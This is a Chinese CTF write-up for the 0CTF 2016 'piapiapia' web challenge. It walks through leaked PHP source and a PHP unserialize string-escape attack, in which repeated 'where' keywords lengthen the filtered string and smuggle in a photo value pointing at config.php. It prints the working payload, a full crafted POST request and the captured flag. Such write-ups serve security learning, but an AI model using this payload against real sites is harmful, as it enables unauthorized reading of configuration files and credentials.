# [0CTF 2016]piapiapia

[题目地址](https://buuoj.cn/challenges#[0CTF%202016]piapiapia)

其实是我知道的考点，就是傻了，纯纯脑抽。

扫目录扫到了www.zip。好东西，是网站源码。都看看里面是啥。register.php没啥好看的，就是记录用户密码名。里面有一段限制值得看看。

```php
		if(strlen($username) < 3 or strlen($username) > 16) 
			die('Invalid user name');

		if(strlen($password) < 3 or strlen($password) > 16) 
			die('Invalid password');
```

用户名和密码都有长度限制。目前还不是问题，继续往下看。index.php里也有类似的长度检查逻辑，还记录了session，也没啥特别的。

```php
//profile.php
<?php
	require_once('class.php');
	if($_SESSION['username'] == null) {
		die('Login First');	
	}
	$username = $_SESSION['username'];
	$profile=$user->show_profile($username);
	if($profile  == null) {
		header('Location: update.php');
	}
	else {
		$profile = unserialize($profile);  //profile来自格式化字符串
		$phone = $profile['phone'];
		$email = $profile['email'];
		$nickname = $profile['nickname'];
		$photo = base64_encode(file_get_contents($profile['photo'])); //photo是profile['photo']的base64编码
?>
<!DOCTYPE html>
<html>
<head>
   <title>Profile</title>
   <link href="static/bootstrap.min.css" rel="stylesheet">
   <script src="static/jquery.min.js"></script>
   <script src="static/bootstrap.min.js"></script>
</head>
<body>
	<div class="container" style="margin-top:100px">  
		<img src="data:image/gif;base64,<?php echo $photo; ?>" class="img-memeda " style="width:180px;margin:0px auto;"> //这里把photo文件的base64编码打印出来
		<h3>Hi <?php echo $nickname;?></h3>
		<label>Phone: <?php echo $phone;?></label>
		<label>Email: <?php echo $email;?></label>
	</div>
</body>
</html>
<?php
	}
?>
```

这个有点东西，unserialize，很难不让人怀疑到反序列化漏洞上。不过现在还看不出来怎么用。

```php
//update.php
<?php
	require_once('class.php');
	if($_SESSION['username'] == null) {
		die('Login First');	
	}
	if($_POST['phone'] && $_POST['email'] && $_POST['nickname'] && $_FILES['photo']) {

		$username = $_SESSION['username'];
		if(!preg_match('/^\d{11}$/', $_POST['phone']))
			die('Invalid phone');

		if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))
			die('Invalid email');
		
		if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)
			die('Invalid nickname');

		$file = $_FILES['photo'];
		if($file['size'] < 5 or $file['size'] > 1000000)
			die('Photo size error');

		move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));
		$profile['phone'] = $_POST['phone'];
		$profile['email'] = $_POST['email'];
		$profile['nickname'] = $_POST['nickname'];
		$profile['photo'] = 'upload/' . md5($file['name']);

		$user->update_profile($username, serialize($profile));  //这里序列化了profile，结合下面user的函数，如果我们有手段篡改profile的反序列化字符串，就能获取flag文件的base64编码
		echo 'Update Profile Success!<a href="profile.php">Your Profile</a>';
	}
	else {
?>
<!DOCTYPE html>
<html>
<head>
   <title>UPDATE</title>
   <link href="static/bootstrap.min.css" rel="stylesheet">
   <script src="static/jquery.min.js"></script>
   <script src="static/bootstrap.min.js"></script>
</head>
<body>
	<div class="container" style="margin-top:100px">  
		<form action="update.php" method="post" enctype="multipart/form-data" class="well" style="width:220px;margin:0px auto;"> 
			<img src="static/piapiapia.gif" class="img-memeda " style="width:180px;margin:0px auto;">
			<h3>Please Update Your Profile</h3>
			<label>Phone:</label>
			<input type="text" name="phone" style="height:30px"class="span3"/>
			<label>Email:</label>
			<input type="text" name="email" style="height:30px"class="span3"/>
			<label>Nickname:</label>
			<input type="text" name="nickname" style="height:30px" class="span3">
			<label for="file">Photo:</label>
			<input type="file" name="photo" style="height:30px"class="span3"/>
			<button type="submit" class="btn btn-primary">UPDATE</button>
		</form>
	</div>
</body>
</html>
<?php
	}
?>
```

看起来class.php是最重要的。

```php
<?php
require('config.php');

class user extends mysql{
	private $table = 'users';

	public function is_exists($username) {
		$username = parent::filter($username);

		$where = "username = '$username'";
		return parent::select($this->table, $where);
	}
	public function register($username, $password) {
		$username = parent::filter($username);
		$password = parent::filter($password);

		$key_list = Array('username', 'password');
		$value_list = Array($username, md5($password));
		return parent::insert($this->table, $key_list, $value_list);
	}
	public function login($username, $password) {
		$username = parent::filter($username);
		$password = parent::filter($password);

		$where = "username = '$username'";
		$object = parent::select($this->table, $where);
		if ($object && $object->password === md5($password)) {
			return true;
		} else {
			return false;
		}
	}
	public function show_profile($username) {
		$username = parent::filter($username);

		$where = "username = '$username'";
		$object = parent::select($this->table, $where);
		return $object->profile;
	}
	public function update_profile($username, $new_profile) {
		$username = parent::filter($username);
		$new_profile = parent::filter($new_profile);  //注意update.php里调用的就是这个函数来更新个人界面，传入的参数new_profile是序列化字符串，这是最重要的一点

		$where = "username = '$username'";
		return parent::update($this->table, 'profile', $new_profile, $where);
	}
	public function __tostring() {
		return __class__;
	}
}

class mysql {
	private $link = null;

	public function connect($config) {
		$this->link = mysql_connect(
			$config['hostname'],
			$config['username'], 
			$config['password']
		);
		mysql_select_db($config['database']);
		mysql_query("SET sql_mode='strict_all_tables'");

		return $this->link;
	}

	public function select($table, $where, $ret = '*') {
		$sql = "SELECT $ret FROM $table WHERE $where";
		$result = mysql_query($sql, $this->link);
		return mysql_fetch_object($result);
	}

	public function insert($table, $key_list, $value_list) {
		$key = implode(',', $key_list);
		$value = '\'' . implode('\',\'', $value_list) . '\''; 
		$sql = "INSERT INTO $table ($key) VALUES ($value)";
		return mysql_query($sql);
	}

	public function update($table, $key, $value, $where) {
		$sql = "UPDATE $table SET $key = '$value' WHERE $where";
		return mysql_query($sql);
	}

	public function filter($string) {
		$escape = array('\'', '\\\\');
		$escape = '/' . implode('|', $escape) . '/';
		$string = preg_replace($escape, '_', $string);

		$safe = array('select', 'insert', 'update', 'delete', 'where');
		$safe = '/' . implode('|', $safe) . '/i';
		return preg_replace($safe, 'hacker', $string);  //filter参数会把所有黑名单内的词语换成hacker，问题前面也提到了，参数string是序列化字符串。序列化字符串有严格的格式，随便替换是会出问题的，特别是当原字符串和替换字符串长度不一致时。白名单里的词语只有一个where是和hacker不一样长度的，就是我们的突破点
	}
	public function __tostring() {
		return __class__;
	}
}
session_start();
$user = new user();
$user->connect($config);
```

格式化字符串逃逸。做这种类型的题第一步一般是看看按照程序设计下正常格式化字符串的格式。

```php
$profile['phone'] = 11111111111;
$profile['email'] = "a@a.com";
$profile['nickname'] = 'a';
$profile['photo'] = 'upload/' . md5("photo_name");
echo serialize($profile);
//a:4:{s:5:"phone";i:11111111111;s:5:"email";s:7:"a@a.com";s:8:"nickname";s:1:"a";s:5:"photo";s:39:"upload/8199788878281cdc8dd16fea0bc71b9d";}
```

我们想要修改profile格式化字符串的photo属性为flag文件名，即config.php,也在源码里能看到。根据正常的格式化字符串，我们最好让逃逸发生在nickname属性对应的地方。不是说其他的就不行，只要想修改的内容在逃逸的内容后面都可以，不过越近自然越简单。还有个坑，前面看过要求nickname长度不能太长，但是想实施逃逸必定要很长的payload。看看[wp](https://blog.csdn.net/weixin_44214568/article/details/124099411)，只要我们在更新profile时抓个包，把nickname的类型改成数组就好了。做个实验：

```php
$a=['asdfsdfsdfsfsdfsafsfs'];
if(strlen($a)<10){
    echo 'yes';
}
//yes
```

但是数组类型的字段格式化字符串会不一样。

```php
$profile['phone'] = 11111111111;
$profile['email'] = "a@a.com";
$profile['nickname'] = ['a'];
$profile['photo'] = 'upload/' . md5("photo_name");
echo serialize($profile);
//a:4:{s:5:"phone";i:11111111111;s:5:"email";s:7:"a@a.com";s:8:"nickname";a:1:{i:0;s:1:"a";}s:5:"photo";s:39:"upload/8199788878281cdc8dd16fea0bc71b9d";}
```

多了一对大括号。那就是要多逃逸几个字符，多加几个where的功夫。总共要逃逸34个字符，便有34个where。最后写个脚本测试，能dump出来就是成功了。

```php
<?php
function filter($string) {
	    $escape = array('\'', '\\\\');
		$escape = '/' . implode('|', $escape) . '/';
		$string = preg_replace($escape, '_', $string);

		$safe = array('select', 'insert', 'update', 'delete', 'where');
		$safe = '/' . implode('|', $safe) . '/i';
		return preg_replace($safe, 'hacker', $string);
	}
$profile['phone'] = 11111111111;
$profile['email'] = "a@a.com";
$profile['nickname'] = ['wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}'];
$profile['photo'] = 'upload/' . md5("photo_name");
$str=serialize($profile);
echo $str;
$str=filter($str);
echo $str;
var_dump(unserialize($str));
```

于是得出exp。先随便注册一个用户，然后更新个人界面。头像随便传一个，重点是抓包，把`nickname`改成`nickname[]`，即数组。

```
POST /update.php HTTP/1.1
Host: a9ca46d4-7350-4ed5-b69b-752b64ec794a.node4.buuoj.cn:81
Content-Length: 155262
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://a9ca46d4-7350-4ed5-b69b-752b64ec794a.node4.buuoj.cn:81
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNVDPjlSNA3buYxvW
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://a9ca46d4-7350-4ed5-b69b-752b64ec794a.node4.buuoj.cn:81/update.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=a8f602e18a1dd44afc985d636f9da0b7
Connection: close

------WebKitFormBoundaryNVDPjlSNA3buYxvW
Content-Disposition: form-data; name="phone"

11111111111
------WebKitFormBoundaryNVDPjlSNA3buYxvW
Content-Disposition: form-data; name="email"

a@a.com
------WebKitFormBoundaryNVDPjlSNA3buYxvW
Content-Disposition: form-data; name="nickname[]"

wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}
------WebKitFormBoundaryNVDPjlSNA3buYxvW
Content-Disposition: form-data; name="photo"; filename="ctf.png.png"
Content-Type: image/png
(省略下方的png数据)
```

现在回到profile.php查看源代码就能看见图片的url是base64了。解码即得flag。

## Flag
> flag{673222ce-11c1-41f2-8b1a-01712530b51b}